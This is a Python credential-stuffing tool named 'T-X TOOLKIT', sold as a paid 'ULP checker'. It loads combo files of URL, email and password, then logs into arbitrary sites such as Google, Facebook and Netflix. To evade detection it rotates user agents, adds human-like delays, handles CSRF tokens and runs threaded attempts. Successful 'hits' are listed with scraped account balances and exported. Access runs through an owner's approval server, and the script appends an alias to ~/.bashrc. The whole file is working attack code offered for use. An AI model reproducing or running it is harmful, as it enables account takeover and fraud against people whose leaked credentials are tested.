#!/usr/bin/env python3
"""
T-X TOOLKIT v2.0 – Advanced ULP Checker (Real Login Engine)
Created by Saeka Tojirp
Usage : tx
"""

import os, sys, time, re, json, threading, random, hashlib, uuid, shutil, logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Suppress noisy logs from requests/urllib3
logging.getLogger("urllib3").setLevel(logging.WARNING)

init(autoreset=True)

# ---------- CONFIG ----------
OWNER_SERVER = "https://request-tracker--mitsukitobashi.replit.app"
APPROVED_FILE = os.path.expanduser("~/.tx_approved")
ALIAS_FILE = os.path.expanduser("~/.bashrc")

R = Fore.RED; G = Fore.GREEN; B = Fore.BLUE; Y = Fore.YELLOW; M = Fore.MAGENTA; C = Fore.CYAN; W = Fore.WHITE
DIM = Style.DIM; BRIGHT = Style.BRIGHT; RES = Style.RESET_ALL
COLOR_LOOP = [Fore.RED, Fore.BLUE, Fore.GREEN]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]

# ---------- UTILS ----------
def tw(): return shutil.get_terminal_size().columns

def fix_url(url):
    if not url: return url
    url = url.strip()
    if not url.startswith(('http://','https://')):
        url = 'https://' + url
    return url

def center_print(text, color=W):
    w = tw()
    print(f"{color}{text.center(w)}{RES}")

def random_delay(min_sec=0.5, max_sec=2.0):
    time.sleep(random.uniform(min_sec, max_sec))

# ---------- ADVANCED LOGIN ENGINE ----------
class LoginChecker:
    def __init__(self, proxy=None):
        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })
        if self.proxy:
            self.session.proxies = self.proxy

    def _extract_form(self, soup, base_url):
        """Find a login form with a password field, return its details."""
        for form in soup.find_all('form'):
            if form.find('input', {'type': 'password'}):
                inputs = {}
                for inp in form.find_all('input'):
                    name = inp.get('name')
                    if name:
                        inputs[name] = inp.get('value', '')

                # Guess username field
                user_field = None
                for key in inputs:
                    if any(k in key.lower() for k in ('user', 'login', 'email', 'name', 'account')):
                        user_field = key
                        break
                if not user_field:
                    # pick the first non‑password, non‑submit, non‑hidden text field
                    for key in inputs:
                        if key.lower() not in ('password','pass','pwd','submit','button','csrf','token'):
                            user_field = key
                            break
                if not user_field:
                    continue  # can't find user field

                pass_field = next((k for k in inputs if 'pass' in k.lower()), 'password')
                action = urljoin(base_url, form.get('action', ''))

                # CSRF token extraction
                csrf_token = None
                csrf_name = None
                for key, val in inputs.items():
                    if 'csrf' in key.lower() or 'token' in key.lower() or 'nonce' in key.lower():
                        csrf_token = val
                        csrf_name = key
                        break
                if not csrf_token:
                    # try meta tag
                    meta = soup.find('meta', {'name': 'csrf-token'})
                    if meta and meta.get('content'):
                        csrf_token = meta['content']
                        csrf_name = 'csrf_token'

                # Extra hidden fields
                extra = {}
                for key, val in inputs.items():
                    if key not in (user_field, pass_field, csrf_name):
                        extra[key] = val

                return {
                    'action': action,
                    'user_field': user_field,
                    'pass_field': pass_field,
                    'csrf_name': csrf_name,
                    'csrf_token': csrf_token,
                    'extra': extra
                }
        return None

    def attempt_login(self, url, email, password):
        """Returns dict with login result."""
        res = {
            'link': url,
            'email': email,
            'pass': password,
            'active': False,
            'info': '',
            'balance': '',
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'platform': self._detect_platform(url)
        }
        url = fix_url(url)

        # Create a fresh session for each attempt (avoids cookie contamination)
        sess = requests.Session()
        sess.headers.update(self.session.headers)
        if self.proxy:
            sess.proxies = self.proxy

        try:
            # Random delay to mimic human
            random_delay(0.5, 1.5)

            # Step 1: GET login page
            resp = sess.get(url, timeout=15, allow_redirects=True)
            resp.raise_for_status()

            # If we are already redirected to a non‑login page, the user might already be logged in?
            # Or the URL might not be a login page. We'll just use the final page for form extraction.
            soup = BeautifulSoup(resp.text, 'html.parser')
            form = self._extract_form(soup, resp.url)

            if not form:
                # No login form found. Try to see if we are already on a "logged in" page.
                if any(kw in resp.text.lower() for kw in ['logout','dashboard','account','profile']):
                    res['active'] = True
                    res['info'] = 'Already logged in (session reuse?)'
                else:
                    res['info'] = 'No login form found'
                return res

            # Step 2: Prepare POST data
            data = {form['user_field']: email, form['pass_field']: password}
            if form['csrf_name'] and form['csrf_token']:
                data[form['csrf_name']] = form['csrf_token']
            data.update(form['extra'])

            # Step 3: Submit login
            # Some sites require a referer header
            sess.headers['Referer'] = url
            post_resp = sess.post(form['action'], data=data, timeout=15, allow_redirects=True)

            # Step 4: Analyze response
            text = post_resp.text.lower()
            final_url = post_resp.url.lower()

            # Success indicators
            success_kw = ['logout', 'dashboard', 'welcome', 'account', 'profile', 'inbox',
                          'home', 'feed', 'member', 'my account', 'sign out']
            fail_kw = ['incorrect', 'invalid', 'wrong', 'error', 'not found',
                       'doesn\'t match', 'does not match', 'please try again',
                       'password is incorrect', 'login failed']

            # 1. Keyword check
            if any(kw in text for kw in success_kw) and not any(kw in text for kw in fail_kw):
                res['active'] = True
                res['info'] = f"HTTP {post_resp.status_code} (keyword)"
            elif any(kw in text for kw in fail_kw):
                res['active'] = False
                res['info'] = "Invalid credentials"
            else:
                # 2. URL redirection away from login
                if 'login' not in final_url and 'signin' not in final_url and 'auth' not in final_url:
                    res['active'] = True
                    res['info'] = "Redirected away from login"
                # 3. Session cookie presence (e.g., most platforms set a session cookie after login)
                elif len(sess.cookies) > 2:  # more than initial session cookie(s)
                    res['active'] = True
                    res['info'] = "Session cookies obtained"
                else:
                    res['active'] = False
                    res['info'] = "Still on login page"

            # Balance extraction (common patterns)
            bal_match = re.search(r'(?:balance|credit|points)[\s:$]*(\d+\.?\d{0,2})', post_resp.text, re.I)
            if bal_match:
                res['balance'] = bal_match.group(1)

        except requests.exceptions.Timeout:
            res['info'] = "Timeout"
        except requests.exceptions.ConnectionError:
            res['info'] = "Connection refused"
        except requests.exceptions.HTTPError as e:
            res['info'] = f"HTTP {e.response.status_code}"
        except Exception as e:
            res['info'] = f"Error: {str(e)[:50]}"

        return res

    def _detect_platform(self, url):
        domain = urlparse(url).netloc.lower()
        if 'google' in domain: return 'Google'
        if 'facebook' in domain or 'fb.com' in domain: return 'Facebook'
        if 'instagram' in domain: return 'Instagram'
        if 'twitter' in domain or 'x.com' in domain: return 'Twitter/X'
        if 'netflix' in domain: return 'Netflix'
        if 'spotify' in domain: return 'Spotify'
        if 'amazon' in domain: return 'Amazon'
        if 'linkedin' in domain: return 'LinkedIn'
        if 'github' in domain: return 'GitHub'
        if 'microsoft' in domain or 'live.com' in domain: return 'Microsoft'
        if 'yahoo' in domain: return 'Yahoo'
        if 'discord' in domain: return 'Discord'
        return domain.split('.')[-2].capitalize() if '.' in domain else 'Generic'

# ---------- AUTHORISATION ----------
def generate_token(name):
    raw = f"{name}-{uuid.uuid4().hex}-{int(time.time())}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()

def request_token_once(name):
    if os.path.exists(APPROVED_FILE):
        with open(APPROVED_FILE,'r') as f:
            if f.read().strip() == 'approved':
                return None, 'approved'
    token = generate_token(name)
    try:
        r = requests.post(f"{OWNER_SERVER}/api/request", json={"name":name,"token":token}, timeout=8)
        if r.status_code == 201:
            data = r.json()
            if data.get('status') == 'approved':
                with open(APPROVED_FILE,'w') as f: f.write('approved')
                return token, 'approved'
            return token, 'pending'
    except:
        pass
    return token, 'pending'

def wait_for_approval(token):
    while True:
        try:
            r = requests.get(f"{OWNER_SERVER}/api/status/{token}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                if data['status'] == 'approved':
                    with open(APPROVED_FILE,'w') as f: f.write('approved')
                    return True
                elif data['status'] == 'declined':
                    return False
        except:
            pass
        time.sleep(3)

# ---------- MAIN TOOL ----------
def main():
    # Splash screen
    for _ in range(10):
        os.system('clear')
        center_print("WELCOME TO T-X TOOLKIT", random.choice(COLOR_LOOP))
        time.sleep(0.5)

    os.system('clear')
    center_print("WHAT SHOULD YOUR NAME BE?", Y)
    name = input(f"  {W}> {RES}").strip()
    if not name: name = "User"

    os.system('clear')
    token, status = request_token_once(name)
    if status == 'approved':
        center_print("ACCESS GRANTED", G)
        time.sleep(1)
    else:
        center_print("PERMISSION REQUIRED!", R)
        time.sleep(0.5)
        center_print(f"YOUR REQUEST TOKEN IS {token}", W)
        center_print("PLEASE ASK THE OWNER TO APPROVE", DIM)
        if not wait_for_approval(token):
            center_print("REQUEST DECLINED!", R)
            sys.exit(0)
        os.system('clear')
        center_print("ACCESS GRANTED", G)
        time.sleep(1)

    # Main loop
    combo_file = None
    hits = []
    checker = LoginChecker(proxy=None)  # can set proxy if needed
    while True:
        os.system('clear')
        w = tw()
        print(f"{G}HI! {name}{RES}  {DIM}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RES}\n")
        # Title
        title = "T-X PAID TOOL"
        glitch_colors = [Fore.RED, Fore.BLUE, Fore.GREEN, Fore.MAGENTA]
        for i,ch in enumerate(title):
            sys.stdout.write(f"{glitch_colors[i%len(glitch_colors)]}{ch}{RES}")
        print("\n")
        menu = [
            "[ 1 ] START CHECKING",
            "[ 2 ] SEE ACCOUNT HITS!",
            "[ 3 ] EXPORT LOGS",
            "[ 4 ] SETUP FILE PATH",
            "[ 5 ] EXIT"
        ]
        for idx,line in enumerate(menu):
            if idx==3 and not combo_file:
                print(f"  {R}{line}{RES}")
            else:
                print(f"  {W}{line}{RES}")

        t = int(time.time()) % 10 // 5
        creator_color = COLOR_LOOP[t]
        print(f"\n  {creator_color}Created{RES} by Saeka Tojirp.", end='')

        try:
            choice = input(f"\n  {W}> {RES}").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if choice == '1':
            if not combo_file:
                print(f"  {R}Please set up the file path first (option 4).{RES}")
                time.sleep(1)
                continue

            combos = []
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'): continue
                    # Parse combo format: URL:EMAIL:PASSWORD  or URL|EMAIL|PASSWORD
                    if '|' in line:
                        parts = line.split('|')
                        if len(parts) >= 3:
                            url, email, passwd = parts[0].strip(), parts[1].strip(), '|'.join(parts[2:]).strip()
                            combos.append((url, email, passwd))
                    elif '://' in line:
                        # https://site.com/login:email:pass
                        # split on first :// then split rest
                        proto, rest = line.split('://', 1)
                        if ':' in rest:
                            domain_part, credentials = rest.split(':', 1)
                            # credentials can contain colon, so split further
                            email, passwd = credentials.split(':', 1) if ':' in credentials else (credentials, '')
                            url = proto + '://' + domain_part
                            combos.append((url.strip(), email.strip(), passwd.strip()))
                    else:
                        parts = line.split(':')
                        if len(parts) >= 3:
                            url = parts[0]
                            email = parts[1]
                            passwd = ':'.join(parts[2:])
                            combos.append((url.strip(), email.strip(), passwd.strip()))

            if not combos:
                print(f"  {R}No valid combos in file.{RES}")
                time.sleep(1)
                continue

            results = []
            total = len(combos)
            done = 0
            active = 0
            lock = threading.Lock()

            print(f"\n  {Y}{'LINK':<35} {'|'} {'USER/EMAIL':<28} {'|'} {'PASS':<20} {'|'} {'STATUS'}{RES}")
            print(f"  {DIM}{'─'*90}{RES}")

            def worker(url, email, passwd):
                nonlocal done, active
                res = checker.attempt_login(url, email, passwd)
                with lock:
                    results.append(res)
                    done += 1
                    if res['active']:
                        active += 1
                    act_str = f"{G}ACCOUNT HIT!{RES}" if res['active'] else f"{R}INVALID{RES}"
                    link_str = res['link'][:33]
                    email_str = res['email'][:26]
                    pass_str = res['pass'][:18]
                    print(f"  {W}{link_str:<35}{DIM} | {RES}{W}{email_str:<28}{DIM} | {RES}{W}{pass_str:<20}{DIM} | {RES}{act_str}")

            with ThreadPoolExecutor(max_workers=5) as ex:
                for url, email, passwd in combos:
                    ex.submit(worker, url, email, passwd)

            print(f"\n  {G}{active}/{total} active.{RES}")
            hits.extend([r for r in results if r['active']])
            time.sleep(1)

        elif choice == '2':
            os.system('clear')
            if not hits:
                print(f"  {Y}No active hits yet.{RES}")
            else:
                page = 0
                per = 5
                while True:
                    os.system('clear')
                    print(f"  {G}ACCOUNT HITS!{RES}  Page {page+1}/{ (len(hits)-1)//per +1 }")
                    for r in hits[page*per:(page+1)*per]:
                        print(f"  {r['email']}:{r['pass']} | {r.get('balance','')} | {r.get('time','')}")
                    print(f"\n  {DIM}[N]ext [P]rev [Q]uit{RES}")
                    k = input().strip().lower()
                    if k == 'n' and page < (len(hits)-1)//per:
                        page += 1
                    elif k == 'p' and page > 0:
                        page -= 1
                    elif k == 'q':
                        break
            time.sleep(0.5)

        elif choice == '3':
            fn = f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(fn, 'w') as f:
                json.dump(hits, f, indent=2)
            print(f"  {G}Exported to {fn}{RES}")
            time.sleep(1)

        elif choice == '4':
            path = input(f"  {W}Enter combo file path: {RES}").strip()
            if os.path.exists(path):
                combo_file = path
                print(f"  {G}File set!{RES}")
            else:
                print(f"  {R}File not found.{RES}")
            time.sleep(1)

        elif choice == '5':
            break

def setup_alias():
    if not os.path.exists(ALIAS_FILE):
        return
    alias_cmd = "alias tx='python3 ~/tx_toolkit.py'"
    with open(ALIAS_FILE, 'r') as f:
        content = f.read()
    if alias_cmd not in content:
        os.system(f"echo \"{alias_cmd}\" >> {ALIAS_FILE}")

if __name__ == "__main__":
    setup_alias()
    main()
